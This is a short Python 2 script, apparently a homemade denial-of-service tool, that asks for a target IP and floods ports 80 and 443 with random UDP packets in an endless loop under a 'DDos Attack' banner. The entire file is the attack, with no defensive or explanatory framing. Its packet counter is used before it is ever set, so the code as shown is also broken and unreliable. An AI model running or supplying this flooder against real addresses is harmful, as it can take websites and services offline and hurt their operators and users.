import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet DDos Attack")
ip = raw_input("IP Target : ")
while True:
     sock.sendto(bytes, (ip,80))
     sock.sendto(bytes, (ip,443))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,80)
